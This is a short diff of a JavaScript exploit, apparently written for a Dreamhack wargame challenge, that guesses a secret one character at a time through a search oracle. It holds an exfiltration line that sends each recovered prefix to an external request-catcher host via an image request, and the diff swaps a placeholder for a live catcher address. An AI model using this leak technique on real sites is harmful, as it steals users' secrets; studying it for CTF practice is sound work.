@@ -29,11 +29,12 @@ async function exploit() {
             if (await search(secret + c)) {
                 secret += c;
                 // 맞춘 글자를 외부 서버로 전송
-                new Image().src = `https://[내-리퀘스트캐처].request.dreamhack.games/${secret}`;
+                new Image().src = `https://hjslggs.request.dreamhack.games/${secret}`;
                 break;
             }
         }
     }
 }
 exploit();
+
 </script>
